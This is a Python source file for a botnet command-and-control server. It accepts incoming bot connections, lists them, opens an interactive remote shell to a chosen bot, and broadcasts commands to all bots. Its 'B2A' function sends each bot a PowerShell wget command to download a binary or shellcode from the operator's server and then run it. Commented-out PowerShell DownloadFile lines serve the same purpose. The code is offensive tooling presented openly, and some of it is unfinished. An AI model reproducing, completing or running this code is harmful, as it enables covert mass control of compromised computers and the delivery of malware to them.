"""
# TODO Fix B2A
"""

import socket
import threading
import os, subprocess
import time
os.chdir(os.path.abspath('/tmp/'))
import requests
#
import http.server
import socketserver

bots=[]
myip="192.168.1.8"
httpPort=6080
port = 6061
pingPort=6066
debug = 0


"""
Start listening
"""
def start_listing(port):
    print("Server listening on port "+str(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen(2)
    sock.settimeout(2)
    return sock

# """
# Receive buffers
# """
# def get_message(conn):
#     print("get_message started")
#     while True:
#         try:
#             data = conn.recv(6282).decode()
#             if len(data) != 0:
#                 print(data[:-1])
#         except:
#             # todo - errors
#             pass
#
# def send_message(conn):
#     print("send_message started")
#     while True:
#         try:
#             message = input(">").strip("\n")
#             message = message + "\r\n"
#             # end shell mode
#             if message == "exit":
#                 break
#             if len(message) != 0:
#                 conn.send(message.encode('utf-8'))
#         except:
#             # todo - errors
#             pass

def execute_command(command):
    if len(command) > 0:
        print(command)
        proc = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, cwd="/tmp")
        return proc

def getIP():
    ip = requests.session().get("http://httpbin.org/ip").text.split(":")[1].split('"')[1]
    print(ip)
    return
    pass

# def upload_binary(bot):
#     #Setup
#     conn = bot[0]
#     addr = bot[1]
#     ip = conn.getpeername()[0]
#     port = conn.getpeername()[1]
#     # ask for the file location
#     binLocation = s_input("Binary? (Absolute path) Ex: /root/winbin/wget.exe")
#     # ask for an ip
#     lhost = s_input("Local host? [0.0.0.0]")
#     # copy the file to tmp.
#     execute_command("cp "+binLocation+" /tmp/")
#     # proc is needed to kill it after the upload process
#     # This http server is at /tmp
#     proc = execute_command("python -m SimpleHTTPServer 8080")
#     #out, err = proc.communicate()
#     location = binLocation.split("/")
#     filename = location[-1]
#     #command = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://"+lhost+":8080/"+filename+"','"+filename+"');"
#     #command = "PowerShell Invoke-WebRequest 'http://"+lhost+":8080/"+filename+"' -OutFile ‘C:\wget.exe’"
#     # Send and print the outputs
#     print("Uploading ..")
#     try:
#         conn.settimeout(2)
#         conn.send(command.encode('utf-8'))
#         conn.recv(6282)
#         conn.recv(6282)
#     except:
#         if debug:
#             print("Failed!")
#         pass
#     proc.kill()
#     pass






"""
LocalLocation is the location on the server
RLocation is the file name for the bot

The idea is to run python HTTP service in the server.
Send command to execute..
execute
close the connection by killing two processes.


# TODO Try to find a way to make this happen.


"""
def B2A(LocalLocation,sendANDrun):
    RLocation = LocalLocation.split("/")[0]
    # Run an http server as a thread
    # httpserver_thread = threading.Thread(target=httpserver, args=(httpPort,))
    # httpserver_thread.daemon = True
    # httpserver_thread.start()

    # setting up the command
    command = "powershell.exe wget http://"+myip+":"+str(httpPort)+"/"+LocalLocation+" -o "+RLocation
    command = command + "\r\n"

    # do this for all bots
    for bot in bots:

        # Setup all needed parameters
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        port = addr[1]

        # Try to send command
        try:
            SR(command,conn,6282,0)
            if sendANDrun == 'yes' and sendANDrun == 'y' and sendANDrun == 'Yes':
                # To execute
                command = "./"+RLocation
                command = command + "\r\n"
                SR(command,conn,6282,0)
            print(str(ip)+" Received")
        except:
            if debug:
                print("Error at one2all(command) when sending to "+str(ip))


"""

"""
def B2AHandler():
    try:
        LocalLocation = input("File location:").strip("\n")
        sendANDrun = input("Upload and run?").strip("\n")
    except KeyboardInterrupt:
        return
    B2A(LocalLocation,sendANDrun)

def send_message(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    print("send_message started")
    while True:
        try:
            message = input("").split("\n")[0]
            # end shell mode
            if message == "exit shell":
                break
            message = message + "\r\n"
            if len(message) != 0:
                conn.send(message.encode('utf-8'))
        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            return
        except:
            # todo - errors
            print("Error")
            pass


"""
Send a command to all bots
"""
def C2A(command):
    for bot in bots:
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        port = addr[1]
        print("Sending to ")
        print(bot)
        try:
            SR(command,conn,6282,0)
            print(str(ip)+" Received")
        except KeyboardInterrupt:
            return
        except:
            if debug:
                print("Error in C2A(command) when sending to "+str(ip))


"""
Handles my inputs
"""
def C2AHandler():
    while True:
        try:
            # Get input
            Command = s_input("C2A:~")
            # If it's exit get out
            if Command == 'exit':
                return
            # Are you sure?
            condition = s_input("Do you want to send ->'"+Command+"' to all bots? [y/N]")
            # Make sure that you want to send it.
            if condition == "y" or condition == "Y":
                print("Sending..")
                # Before sending it
                # Fix add newline to execute the command
                Command = Command + "\r\n"
                C2A(Command)
            else:
                print("No data has sent")
                #
        except KeyboardInterrupt:
            return
        except:
            print("Error in C2AHandler")
            return

"""
Send one command and recv "r_buffer" size of buffer.
"""
def SR(command,conn,r_buffer,waitForData):
    try:
        conn.send(command.encode('utf-8'))
        if waitForData:
            return conn.recv(r_buffer)
    except KeyboardInterrupt:
            return
    except:
            return

"""
Start shell mode
"""
def talk(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    # start a new thread to send strings/commands.
    send_message_thread = threading.Thread(target=send_message, args=(bot,))
    send_message_thread.daemon = True
    send_message_thread.start()
    conn.settimeout(2)
    while send_message_thread.isAlive():
        try:
            data = conn.recv(6282).decode().strip("\n")[:-1]
            if len(data) != 0:
                print(data)
        except:
            pass


def s_input(string):
    return input("["+string+"]>").strip("\n")

"""
print all bots
"""
def list():
    #[conn, addr]
    for bot in bots:
        try:
            addr = bot[1]
            conn = bot[0]
            ip = addr[0]
            port = addr[1]
            print(str(ip)+" at "+str(port))
        except:
            pass

"""
Stop
"""
def kill_all():
    for bot in bots:
        print(bot)

"""
Find a match
name = ip
"""
def find_bot(name):
    for bot in bots:
        ip = bot[0].getpeername()[0]
        if name == ip:
            return bot
    return []

def help(type):
    if type == 0:
        print("list      List all bots"
              "C2A       Send a Command 2 All bots"
              "B2A       Send a Binary/Shellcode 2 All bots"
              "C2I       Send a Command 2 one IP"
              "B2I       Send a Binary/Shellcode 2 one IP")
    pass

def ping():
    # new implementation
    # [conn, addr, pingConn, pingAddr]
    for bot in bots:
        pingConn = bot[3]
        pingAddr = bot[2]
        SR("111",pingConn,1024,0)
        pass


def console():
    while 1:
        Command = s_input("MB:~")
        if len(Command) <= 0:
            continue
        # if command is a valid ip
        bot = find_bot(Command)
        # if bot exists.
        if len(bot) >= 2:
            talk(bot)
            continue
        elif Command == "list":
            list()
        # Send a command to all bots
        elif Command == "help":
            help(0)
        # Send a command to all bots
        elif Command == "C2A":
            C2AHandler()
        # Send a binary to all bots
        elif Command == "B2A":
            B2AHandler()
            pass
        elif Command == "C2I":
            pass
        elif Command == "B2I":
            list()
            name = s_input("Who?")
            bot = find_bot(name)
            #upload_binary(bot)
        elif Command == "ping" or Command == "PING":
            ping()
        elif Command == "exit":
            break
        else:
            pass

def main():
    global bots
    #pingSock = start_listing(pingPort)
    mainSock = start_listing(port)
    consoleT = threading.Thread(target=console, args=())
    consoleT.daemon = True
    consoleT.start()

    while consoleT.isAlive():
        try:
            #pingConn, pingAddr = pingSock.accept()
            conn, addr = mainSock.accept()
            #print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")
            print("\n"+str(addr[0])+":"+str(addr[1])+" has connected")
            #bots.append([conn, addr,pingConn,pingAddr])
            bots.append([conn, addr])
        except:
            pass
    mainSock.close()
    #pingSock.close()

if __name__ == '__main__':
    pass
    #getIP()
    main()
